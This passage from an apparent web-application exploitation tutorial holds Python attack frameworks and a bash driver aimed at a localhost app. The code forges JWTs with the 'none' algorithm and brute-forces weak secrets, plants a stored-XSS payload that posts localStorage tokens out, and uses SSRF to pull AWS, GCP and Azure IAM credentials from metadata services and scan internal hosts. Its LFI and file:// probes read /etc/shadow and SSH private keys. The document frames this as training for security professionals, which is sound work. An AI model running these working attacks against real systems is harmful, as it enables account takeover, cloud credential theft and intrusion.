rial 4: Session Management Exploitation

### Phase 1: Session Token Analysis and Weakness Discovery

```python
#!/usr/bin/env python3
"""
Session Management Vulnerability Exploitation Framework
"""

import requests
import jwt
import base64
import json
import time
import hashlib
from datetime import datetime, timedelta
import secrets

class SessionExploitationFramework:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def analyze_jwt_token(self, token):
        """Analyze JWT token for vulnerabilities"""
        print("\n[+] Analyzing JWT token structure...")
        
        try:
            # Decode without verification to analyze structure
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            analysis = {
                'header': header,
                'payload': payload,
                'vulnerabilities': []
            }
            
            # Check for weak algorithms
            if header.get('alg') in ['none', 'HS256']:
                analysis['vulnerabilities'].append({
                    'type': 'weak_algorithm',
                    'description': f"Weak algorithm: {header.get('alg')}",
                    'severity': 'HIGH'
                })
            
            # Check for long expiration
            if 'exp' in payload:
                exp_time = datetime.fromtimestamp(payload['exp'])
                iat_time = datetime.fromtimestamp(payload.get('iat', time.time()))
                duration = exp_time - iat_time
                
                if duration.days > 7:
                    analysis['vulnerabilities'].append({
                        'type': 'long_expiration',
                        'description': f"Token expires in {duration.days} days",
                        'severity': 'MEDIUM'
                    })
            
            # Check for sensitive information in payload
            sensitive_fields = ['password', 'secret', 'key', 'admin']
            for field in sensitive_fields:
                if any(field in str(value).lower() for value in payload.values()):
                    analysis['vulnerabilities'].append({
                        'type': 'sensitive_data_exposure',
                        'description': f"Sensitive data in payload: {field}",
                        'severity': 'HIGH'
                    })
            
            print(f"  ✓ JWT Analysis complete - {len(analysis['vulnerabilities'])} vulnerabilities found")
            return analysis
            
        except Exception as e:
            print(f"  ✗ Error analyzing JWT: {e}")
            return None
    
    def test_jwt_secret_weakness(self, token):
        """Test JWT for weak secrets"""
        print("\n[+] Testing JWT secret strength...")
        
        # Common weak secrets
        weak_secrets = [
            'secret',
            'password',
            '123456',
            'your-256-bit-secret',
            'weak-secret-key',
            'jwt-secret',
            'default',
            'admin',
            'test',
            ''
        ]
        
        for secret in weak_secrets:
            try:
                decoded = jwt.decode(token, secret, algorithms=['HS256'])
                print(f"  🚨 WEAK SECRET FOUND: '{secret}'")
                return {
                    'weak_secret': secret,
                    'decoded_payload': decoded,
                    'vulnerability': 'JWT signed with weak secret'
                }
            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue
        
        print("  ✓ No weak secrets found in common list")
        return None
    
    def test_jwt_algorithm_confusion(self, token):
        """Test for JWT algorithm confusion attacks"""
        print("\n[+] Testing JWT algorithm confusion...")
        
        try:
            # Get the original payload
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Test 'none' algorithm
            none_token = jwt.encode(payload, '', algorithm='none')
            
            # Test the none token
            test_response = self.session.get(
                f"{self.base_url}/api/users/profile",
                headers={'Authorization': f'Bearer {none_token}'}
            )
            
            if test_response.status_code == 200:
                print("  🚨 ALGORITHM CONFUSION: 'none' algorithm accepted")
                return {
                    'vulnerability': 'none_algorithm_accepted',
                    'malicious_token': none_token,
                    'response': test_response.json()
                }
            
            print("  ✓ 'none' algorithm properly rejected")
            return None
            
        except Exception as e:
            print(f"  ✗ Error testing algorithm confusion: {e}")
            return None
    
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        print("\n[+] Testing session fixation...")
        
        # Step 1: Get a session before authentication
        pre_auth_response = self.session.get(f"{self.base_url}/api/health")
        pre_auth_cookies = self.session.cookies.get_dict()
        
        # Step 2: Authenticate
        login_data = {"email": "test@example.com", "password": "password123"}
        auth_response = self.session.post(f"{self.base_url}/api/auth/login", json=login_data)
        
        if auth_response.status_code == 200:
            post_auth_cookies = self.session.cookies.get_dict()
            
            # Check if session ID changed after authentication
            session_changed = False
            for cookie_name in pre_auth_cookies:
                if cookie_name in post_auth_cookies:
                    if pre_auth_cookies[cookie_name] != post_auth_cookies[cookie_name]:
                        session_changed = True
                        break
            
            if not session_changed:
                print("  🚨 SESSION FIXATION: Session ID not regenerated after login")
                return {
                    'vulnerability': 'session_fixation',
                    'pre_auth_cookies': pre_auth_cookies,
                    'post_auth_cookies': post_auth_cookies
                }
            else:
                print("  ✓ Session ID properly regenerated after login")
        
        return None
    
    def test_session_hijacking(self, valid_token):
        """Test session hijacking scenarios"""
        print("\n[+] Testing session hijacking scenarios...")
        
        results = []
        
        # Test 1: Token in URL (if application supports it)
        url_token_test = f"{self.base_url}/api/users/profile?token={valid_token}"
        response = self.session.get(url_token_test)
        
        if response.status_code == 200:
            results.append({
                'vulnerability': 'token_in_url',
                'description': 'Token accepted in URL parameter',
                'severity': 'HIGH'
            })
            print("  🚨 TOKEN IN URL: Authentication token accepted in URL")
        
        # Test 2: Token in localStorage (check via XSS simulation)
        xss_payload = """
        <script>
        if (localStorage.getItem('token')) {
            fetch('/api/steal-token', {
                method: 'POST',
                body: JSON.stringify({token: localStorage.getItem('token')}),
                headers: {'Content-Type': 'application/json'}
            });
        }
        </script>
        """
        
        # Test if XSS can access localStorage token
        comment_response = self.session.post(
            f"{self.base_url}/api/comments/task/1",
            headers={'Authorization': f'Bearer {valid_token}'},
            json={'content': xss_payload}
        )
        
        if comment_response.status_code in [200, 201]:
            results.append({
                'vulnerability': 'token_in_localstorage',
                'description': 'Token stored in localStorage, accessible via XSS',
                'severity': 'HIGH'
            })
            print("  🚨 LOCALSTORAGE TOKEN: Token accessible via XSS")
        
        return results
    
    def test_concurrent_sessions(self, credentials):
        """Test concurrent session handling"""
        print("\n[+] Testing concurrent session handling...")
        
        # Create multiple sessions with same credentials
        sessions = []
        
        for i in range(3):
            session = requests.Session()
            login_response = session.post(
                f"{self.base_url}/api/auth/login",
                json=credentials
            )
            
            if login_response.status_code == 200:
                token = login_response.json().get('token')
                sessions.append({
                    'session': session,
                    'token': token,
                    'session_id': i + 1
                })
        
        # Test if all sessions remain valid
        valid_sessions = 0
        for session_info in sessions:
            test_response = session_info['session'].get(
                f"{self.base_url}/api/users/profile",
                headers={'Authorization': f'Bearer {session_info["token"]}'}
            )
            
            if test_response.status_code == 200:
                valid_sessions += 1
        
        if valid_sessions > 1:
            print(f"  🚨 CONCURRENT SESSIONS: {valid_sessions} sessions active simultaneously")
            return {
                'vulnerability': 'concurrent_sessions',
                'active_sessions': valid_sessions,
                'description': 'Multiple sessions allowed for same user'
            }
        else:
            print("  ✓ Concurrent sessions properly restricted")
        
        return None
    
    def comprehensive_session_test(self, credentials):
        """Perform comprehensive session management testing"""
        print("=== Comprehensive Session Management Assessment ===")
        
        results = {
            'jwt_analysis': None,
            'weak_secret': None,
            'algorithm_confusion': None,
            'session_fixation': None,
            'session_hijacking': [],
            'concurrent_sessions': None
        }
        
        # Step 1: Authenticate and get token
        login_response = self.session.post(f"{self.base_url}/api/auth/login", json=credentials)
        
        if login_response.status_code != 200:
            print("Authentication failed")
            return results
        
        token = login_response.json().get('token')
        if not token:
            print("No token received")
            return results
        
        # Step 2: Analyze JWT token
        jwt_analysis = self.analyze_jwt_token(token)
        results['jwt_analysis'] = jwt_analysis
        
        # Step 3: Test for weak secrets
        weak_secret_result = self.test_jwt_secret_weakness(token)
        results['weak_secret'] = weak_secret_result
        
        # Step 4: Test algorithm confusion
        algorithm_confusion_result = self.test_jwt_algorithm_confusion(token)
        results['algorithm_confusion'] = algorithm_confusion_result
        
        # Step 5: Test session fixation
        session_fixation_result = self.test_session_fixation()
        results['session_fixation'] = session_fixation_result
        
        # Step 6: Test session hijacking
        hijacking_results = self.test_session_hijacking(token)
        results['session_hijacking'] = hijacking_results
        
        # Step 7: Test concurrent sessions
        concurrent_result = self.test_concurrent_sessions(credentials)
        results['concurrent_sessions'] = concurrent_result
        
        return results

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    credentials = {
        "email": "test@example.com",
        "password": "password123"
    }
    
    # Initialize session framework
    session_framework = SessionExploitationFramework(BASE_URL)
    
    # Perform comprehensive session testing
    results = session_framework.comprehensive_session_test(credentials)
    
    # Save results
    with open('session_exploitation_results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n=== Session Management Testing Complete ===")
    
    # Count vulnerabilities
    vuln_count = 0
    if results['jwt_analysis'] and results['jwt_analysis']['vulnerabilities']:
        vuln_count += len(results['jwt_analysis']['vulnerabilities'])
    if results['weak_secret']:
        vuln_count += 1
    if results['algorithm_confusion']:
        vuln_count += 1
    if results['session_fixation']:
        vuln_count += 1
    if results['session_hijacking']:
        vuln_count += len(results['session_hijacking'])
    if results['concurrent_sessions']:
        vuln_count += 1
    
    print(f"Total vulnerabilities found: {vuln_count}")
    print(f"Results saved to session_exploitation_results.json")
```

## Tutorial 5: SSRF and LFI Exploitation

### Phase 1: SSRF Discovery and Cloud Metadata Exploitation

```python
#!/usr/bin/env python3
"""
SSRF and LFI Exploitation Framework
"""

import requests
import json
import time
import socket
import threading
from urllib.parse import quote, urljoin
import base64

class SSRFLFIExploitationFramework:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.auth_token = auth_token
        self.session = requests.Session()
        self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
        
    def discover_ssrf_endpoints(self):
        """Discover potential SSRF vulnerable endpoints"""
        print("\n[+] Discovering SSRF vulnerable endpoints...")
        
        # Common SSRF-prone endpoints
        test_endpoints = [
            {'url': '/api/users/avatar', 'method': 'POST', 'param': 'imageUrl', 'trigger_param': 'fetchFromUrl'},
            {'url': '/api/tasks/import', 'method': 'POST', 'param': 'importUrl'},
            {'url': '/api/webhook/callback', 'method': 'POST', 'param': 'url'},
            {'url': '/api/proxy/fetch', 'method': 'POST', 'param': 'target'},
            {'url': '/api/reports/generate', 'method': 'POST', 'param': 'dataSource'},
            {'url': '/api/integrations/test', 'method': 'POST', 'param': 'endpoint'}
        ]
        
        vulnerable_endpoints = []
        
        # Test with external service to confirm SSRF
        test_url = "http://httpbin.org/ip"
        
        for endpoint in test_endpoints:
            print(f"  Testing {endpoint['method']} {endpoint['url']}")
            
            try:
                payload = {endpoint['param']: test_url}
                
                # Add trigger parameter if specified
                if 'trigger_param' in endpoint:
                    payload[endpoint['trigger_param']] = True
                
                response = self.session.request(
                    endpoint['method'],
                    f"{self.base_url}{endpoint['url']}",
                    json=payload,
                    timeout=10
                )
                
                # Check if external request was made
                if response.status_code == 200 and ('origin' in response.text.lower() or 'ip' in response.text.lower()):
                    vulnerable_endpoints.append({
                        'endpoint': endpoint,
                        'confirmed_ssrf': True,
                        'test_response': response.text[:200]
                    })
                    print(f"    ✓ SSRF confirmed on {endpoint['url']}")
                    
            except Exception as e:
                print(f"    ✗ Error testing {endpoint['url']}: {e}")
        
        return vulnerable_endpoints
    
    def exploit_cloud_metadata(self, ssrf_endpoint):
        """Exploit cloud metadata services"""
        print(f"\n[+] Exploiting cloud metadata via {ssrf_endpoint['endpoint']['url']}")
        
        # Cloud metadata endpoints
        metadata_endpoints = {
            'aws_ec2': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/instance-id',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data'
            ],
            'gcp': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                'http://metadata.google.internal/computeMetadata/v1/project/project-id'
            ],
            'azure': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
            ]
        }
        
        results = {}
        
        for cloud_provider, endpoints in metadata_endpoints.items():
            print(f"  Testing {cloud_provider.upper()} metadata service...")
            results[cloud_provider] = []
            
            for metadata_url in endpoints:
                try:
                    payload = {ssrf_endpoint['endpoint']['param']: metadata_url}
                    
                    # Add trigger parameter if needed
                    if 'trigger_param' in ssrf_endpoint['endpoint']:
                        payload[ssrf_endpoint['endpoint']['trigger_param']] = True
                    
                    response = self.session.request(
                        ssrf_endpoint['endpoint']['method'],
                        f"{self.base_url}{ssrf_endpoint['endpoint']['url']}",
                        json=payload,
                        timeout=15
                    )
                    
                    if response.status_code == 200 and len(response.text) > 10:
                        results[cloud_provider].append({
                            'metadata_url': metadata_url,
                            'response': response.text,
                            'success': True
                        })
                        print(f"    ✓ {cloud_provider.upper()} metadata accessed: {metadata_url}")
                        
                        # If this is IAM credentials endpoint, try to extract role names
                        if 'security-credentials' in metadata_url and response.text:
                            role_names = response.text.strip().split('\n')
                            for role_name in role_names:
                                if role_name.strip():
                                    cred_url = f"{metadata_url}{role_name.strip()}"
                                    cred_payload = {ssrf_endpoint['endpoint']['param']: cred_url}
                                    
                                    if 'trigger_param' in ssrf_endpoint['endpoint']:
                                        cred_payload[ssrf_endpoint['endpoint']['trigger_param']] = True
                                    
                                    cred_response = self.session.request(
                                        ssrf_endpoint['endpoint']['method'],
                                        f"{self.base_url}{ssrf_endpoint['endpoint']['url']}",
                                        json=cred_payload,
                                        timeout=15
                                    )
                                    
                                    if cred_response.status_code == 200:
                                        results[cloud_provider].append({
                                            'metadata_url': cred_url,
                                            'response': cred_response.text,
                                            'credentials': True,
                                            'role_name': role_name.strip()
                                        })
                                        print(f"    🚨 CREDENTIALS EXTRACTED for role: {role_name.strip()}")
                    
                except Exception as e:
                    print(f"    ✗ Error accessing {metadata_url}: {e}")
        
        return results
    
    def scan_internal_network(self, ssrf_endpoint):
        """Scan internal network using SSRF"""
        print(f"\n[+] Scanning internal network via SSRF...")
        
        # Common internal IP ranges and ports
        internal_ranges = [
            '192.168.1.{}',
            '192.168.0.{}',
            '10.0.0.{}',
            '172.16.0.{}',
            '127.0.0.{}'
        ]
        
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
        
        results = []
        
        # Scan localhost first
        print("  Scanning localhost services...")
        for port in common_ports:
            target_url = f"http://localhost:{port}"
            
            try:
                payload = {ssrf_endpoint['endpoint']['param']: target_url}
                
                if 'trigger_param' in ssrf_endpoint['endpoint']:
                    payload[ssrf_endpoint['endpoint']['trigger_param']] = True
                
                response = self.session.request(
                    ssrf_endpoint['endpoint']['method'],
                    f"{self.base_url}{ssrf_endpoint['endpoint']['url']}",
                    json=payload,
                    timeout=5
                )
                
                if response.status_code == 200 and len(response.text) > 10:
                    results.append({
                        'target': target_url,
                        'port': port,
                        'response_size': len(response.text),
                        'service_detected': True,
                        'response_snippet': response.text[:100]
                    })
                    print(f"    ✓ Service found on localhost:{port}")
                    
            except Exception as e:
                continue
        
        # Scan internal network ranges (limited scan)
        print("  Scanning internal network ranges...")
        for ip_range in internal_ranges[:2]:  # Limit to first 2 ranges
            for host_num in range(1, 11):  # Scan first 10 hosts
                target_ip = ip_range.format(host_num)
                target_url = f"http://{target_ip}"
                
                try:
                    payload = {ssrf_endpoint['endpoint']['param']: target_url}
                    
                    if 'trigger_param' in ssrf_endpoint['endpoint']:
                        payload[ssrf_endpoint['endpoint']['trigger_param']] = True
                    
                    response = self.session.request(
                        ssrf_endpoint['endpoint']['method'],
                        f"{self.base_url}{ssrf_endpoint['endpoint']['url']}",
                        json=payload,
                        timeout=3
                    )
                    
                    if response.status_code == 200 and len(response.text) > 10:
                        results.append({
                            'target': target_url,
                            'ip': target_ip,
                            'response_size': len(response.text),
                            'host_alive': True
                        })
                        print(f"    ✓ Host alive: {target_ip}")
                        
                except Exception as e:
                    continue
        
        return results
    
    def test_lfi_vulnerabilities(self):
        """Test for Local File Inclusion vulnerabilities"""
        print("\n[+] Testing Local File Inclusion vulnerabilities...")
        
        # LFI test endpoints
        lfi_endpoints = [
            {'url': '/api/files/{filename}', 'method': 'GET'},
            {'url': '/api/download/{path}', 'method': 'GET'},
            {'url': '/api/logs/{logfile}', 'method': 'GET'},
            {'url': '/api/backup/{filename}', 'method': 'GET'}
        ]
        
        # Common sensitive files
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/proc/cpuinfo',
            '/var/log/auth.log',
            '/var/log/apache2/access.log',
            '/home/user/.ssh/id_rsa',
            '/root/.ssh/id_rsa',
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/app/.env',
            '/app/config.json',
            '/app/package.json'
        ]
        
        results = []
        
        for endpoint in lfi_endpoints:
            print(f"  Testing LFI on {endpoint['url']}")
            
            for file_path in sensitive_files:
                try:
                    # URL encode the path
                    encoded_path = quote(file_path, safe='')
                    test_url = f"{self.base_url}{endpoint['url'].format(filename=encoded_path, path=encoded_path, logfile=encoded_path)}"
                    
                    response = self.session.request(
                        endpoint['method'],
                        test_url,
                        timeout=5
                    )
                    
                    # Check for successful file read
                    if response.status_code == 200 and len(response.text) > 10:
                        # Look for file content indicators
                        content_indicators = [
                            'root:',  # /etc/passwd
                            'localhost',  # /etc/hosts
                            'Linux version',  # /proc/version
                            'processor',  # /proc/cpuinfo
                            '-----BEGIN',  # SSH keys
                            'DATABASE_URL',  # .env files
                            '"name":',  # package.json
                        ]
                        
                        if any(indicator in response.text for indicator in content_indicators):
                            results.append({
                                'endpoint': endpoint['url'],
                                'file_path': file_path,
                                'encoded_path': encoded_path,
                                'response_size': len(response.text),
                                'content_snippet': response.text[:200],
                                'lfi_confirmed': True
                            })
                            print(f"    🚨 LFI SUCCESS: {file_path}")
                            
                except Exception as e:
                    continue
        
        return results
    
    def test_ssrf_via_file_protocol(self, ssrf_endpoint):
        """Test SSRF using file:// protocol"""
        print(f"\n[+] Testing SSRF with file:// protocol...")
        
        file_targets = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/version',
            'file:///app/.env',
            'file:///var/log/auth.log',
            'file:///root/.ssh/id_rsa'
        ]
        
        results = []
        
        for file_url in file_targets:
            try:
                payload = {ssrf_endpoint['endpoint']['param']: file_url}
                
                if 'trigger_param' in ssrf_endpoint['endpoint']:
                    payload[ssrf_endpoint['endpoint']['trigger_param']] = True
                
                response = self.session.request(
                    ssrf_endpoint['endpoint']['method'],
                    f"{self.base_url}{ssrf_endpoint['endpoint']['url']}",
                    json=payload,
                    timeout=10
                )
                
                if response.status_code == 200 and len(response.text) > 10:
                    results.append({
                        'file_url': file_url,
                        'response_size': len(response.text),
                        'content': response.text,
                        'file_read_success': True
                    })
                    print(f"    ✓ File read successful: {file_url}")
                    
            except Exception as e:
                print(f"    ✗ Error reading {file_url}: {e}")
        
        return results
    
    def comprehensive_ssrf_lfi_test(self):
        """Perform comprehensive SSRF and LFI testing"""
        print("=== Comprehensive SSRF and LFI Assessment ===")
        
        results = {
            'ssrf_discovery': [],
            'cloud_metadata': {},
            'internal_network_scan': [],
            'lfi_vulnerabilities': [],
            'file_protocol_ssrf': []
        }
        
        # Step 1: Discover SSRF endpoints
        ssrf_endpoints = self.discover_ssrf_endpoints()
        results['ssrf_discovery'] = ssrf_endpoints
        
        if ssrf_endpoints:
            # Use first confirmed SSRF endpoint for further testing
            primary_ssrf = ssrf_endpoints[0]
            
            # Step 2: Exploit cloud metadata
            metadata_results = self.exploit_cloud_metadata(primary_ssrf)
            results['cloud_metadata'] = metadata_results
            
            # Step 3: Scan internal network
            network_scan_results = self.scan_internal_network(primary_ssrf)
            results['internal_network_scan'] = network_scan_results
            
            # Step 4: Test file protocol SSRF
            file_protocol_results = self.test_ssrf_via_file_protocol(primary_ssrf)
            results['file_protocol_ssrf'] = file_protocol_results
        
        # Step 5: Test LFI vulnerabilities
        lfi_results = self.test_lfi_vulnerabilities()
        results['lfi_vulnerabilities'] = lfi_results
        
        return results

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication token
    def get_auth_token(base_url, email, password):
        login_data = {"email": email, "password": password}
        response = requests.post(f"{base_url}/api/auth/login", json=login_data)
        return response.json().get('token') if response.status_code == 200 else None
    
    token = get_auth_token(BASE_URL, "attacker@test.com", "password123")
    
    if token:
        # Initialize SSRF/LFI framework
        ssrf_lfi_framework = SSRFLFIExploitationFramework(BASE_URL, token)
        
        # Perform comprehensive testing
        results = ssrf_lfi_framework.comprehensive_ssrf_lfi_test()
        
        # Save results
        with open('ssrf_lfi_exploitation_results.json', 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n=== SSRF and LFI Testing Complete ===")
        print(f"SSRF endpoints found: {len(results['ssrf_discovery'])}")
        print(f"Cloud metadata accessed: {sum(len(v) for v in results['cloud_metadata'].values())}")
        print(f"Internal services found: {len(results['internal_network_scan'])}")
        print(f"LFI vulnerabilities: {len(results['lfi_vulnerabilities'])}")
        print(f"File protocol SSRF: {len(results['file_protocol_ssrf'])}")
        print(f"Results saved to ssrf_lfi_exploitation_results.json")
    else:
        print("Authentication failed")
```

## Automated Testing Integration

### Master Exploitation Script

```bash
#!/bin/bash
# Master Vulnerability Exploitation Script

echo "=== Comprehensive Vulnerability Exploitation Suite ==="

# Configuration
TARGET_URL="http://localhost:3000"
OUTPUT_DIR="./exploitation_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Create output directory
mkdir -p "$OUTPUT_DIR/$TIMESTAMP"

# Test credentials
TEST_EMAIL="attacker@test.com"
TEST_PASSWORD="password123"

echo "[+] Starting comprehensive vulnerability exploitation..."
echo "    Target: $TARGET_URL"
echo "    Output: $OUTPUT_DIR/$TIMESTAMP"

# Run SQL Injection tests
echo ""
echo "=== SQL Injection Exploitation ==="
python3 sql_injection_framework.py > "$OUTPUT_DIR/$TIMESTAMP/sql_injection.log" 2>&1
if [ $? -eq 0 ]; then
    echo "✓ SQL Injection testing completed"
else
    echo "✗ SQL Injection testing failed"
fi

# Run XSS tests
echo ""
echo "=== XSS Exploitation ==="
python3 xss_exploitation_framework.py > "$OUTPUT_DIR/$TIMESTAMP/xss_exploitation.log" 2>&1
if [ $? -eq 0 ]; then
    echo "✓ XSS testing completed"
else
    echo "✗ XSS testing failed"
fi

# Run IDOR tests
echo ""
echo "=== IDOR Exploitation ==="
python3 idor_exploitation_framework.py > "$OUTPUT_DIR/$TIMESTAMP/idor_exploitation.log" 2>&1
if [ $? -eq 0 ]; then
    echo "✓ IDOR testing completed"
else
    echo "✗ IDOR testing failed"
fi

# Run Session Management tests
echo ""
echo "=== Session Management Exploitation ==="
python3 session_exploitation_framework.py > "$OUTPUT_DIR/$TIMESTAMP/session_exploitation.log" 2>&1
if [ $? -eq 0 ]; then
    echo "✓ Session Management testing completed"
else
    echo "✗ Session Management testing failed"
fi

# Run SSRF/LFI tests
echo ""
echo "=== SSRF and LFI Exploitation ==="
python3 ssrf_lfi_exploitation_framework.py > "$OUTPUT_DIR/$TIMESTAMP/ssrf_lfi_exploitation.log" 2>&1
if [ $? -eq 0 ]; then
    echo "✓ SSRF/LFI testing completed"
else
    echo "✗ SSRF/LFI testing failed"
fi

# Generate comprehensive report
echo ""
echo "=== Generating Comprehensive Report ==="

cat > "$OUTPUT_DIR/$TIMESTAMP/executive_summary.md" << EOF
# Vulnerability Exploitation Report

**Target Application:** $TARGET_URL  
**Test Date:** $(date)  
**Test Duration:** Comprehensive automated testing  

## Executive Summary

This report contains the results of comprehensive vulnerability exploitation testing performed against the target application. The testing covered the OWASP Top 10 vulnerabilities and advanced attack scenarios.

## Vulnerabilities Tested

1. **SQL Injection (CWE-89)**
   - Union-based injection
   - Boolean-based blind injection
   - Time-based blind injection
   - Error-based injection

2. **Cross-Site Scripting (CWE-79)**
   - Stored XSS
   - Reflected XSS
   - DOM-based XSS
   - XSS worm propagation

3. **Insecure Direct Object References (CWE-639)**
   - Cross-user data access
   - Bulk object enumeration
   - Parameter pollution
   - ID format variations

4. **Session Management Vulnerabilities (CWE-384)**
   - JWT token analysis
   - Weak secret detection
   - Algorithm confusion
   - Session fixation
   - Concurrent session handling

5. **Server-Side Request Forgery & Local File Inclusion (CWE-918, CWE-22)**
   - Cloud metadata service exploitation
   - Internal network reconnaissance
   - File system access
   - Protocol smuggling

## Test Results Summary

$(find "$OUTPUT_DIR/$TIMESTAMP" -name "*.json" -exec echo "- {}" \; | wc -l) detailed result files generated
$(find "$OUTPUT_DIR/$TIMESTAMP" -name "*.log" -exec grep -l "SUCCESS\|FOUND\|VULNERABLE" {} \; | wc -l) vulnerabilities confirmed

## Recommendations

1. **Immediate Actions (Critical)**
   - Implement parameterized queries for all database interactions
   - Add comprehensive input validation and output encoding
   - Implement proper authorization checks for all object access
   - Use secure session management practices
   - Validate and restrict all external URL requests

2. **Short-term Actions (High Priority)**
   - Deploy Web Application Firewall (WAF)
   - Implement Content Security Policy (CSP)
   - Add rate limiting and monitoring
   - Conduct security code review
   - Implement automated security testing in CI/CD

3. **Long-term Actions (Medium Priority)**
   - Regular penetration testing
   - Security awareness training
   - Implement security monitoring and alerting
   - Establish incident response procedures
   - Regular security audits and assessments

## Detailed Results

Detailed exploitation results and evidence can be found in the following files:
- SQL Injection: sql_injection_results.json
- XSS: xss_exploitation_results.json
- IDOR: idor_exploitation_results.json
- Session Management: session_exploitation_results.json
- SSRF/LFI: ssrf_lfi_exploitation_results.json

EOF

echo "✓ Executive summary generated: $OUTPUT_DIR/$TIMESTAMP/executive_summary.md"

# Create ZIP archive of all results
cd "$OUTPUT_DIR"
zip -r "vulnerability_exploitation_${TIMESTAMP}.zip" "$TIMESTAMP/"
echo "✓ Results archived: vulnerability_exploitation_${TIMESTAMP}.zip"

echo ""
echo "=== Exploitation Testing Complete ==="
echo "All results saved in: $OUTPUT_DIR/$TIMESTAMP/"
```

## Conclusion

This comprehensive exploitation tutorial framework provides:

1. **Complete vulnerability coverage** for all 5 major vulnerability types
2. **Professional-grade testing tools** with automation and reporting
3. **Real-world attack scenarios** and advanced exploitation techniques
4. **Integration with industry-standard tools** (SQLMap, Burp Suite, Selenium)
5. **Comprehensive reporting** and evidence collection
6. **Educational value** with detailed explanations and methodologies

The tutorials are designed for security professionals to understand both offensive and defensive perspectives, enabling better security implementations and testing practices.

> Prepared by haseeb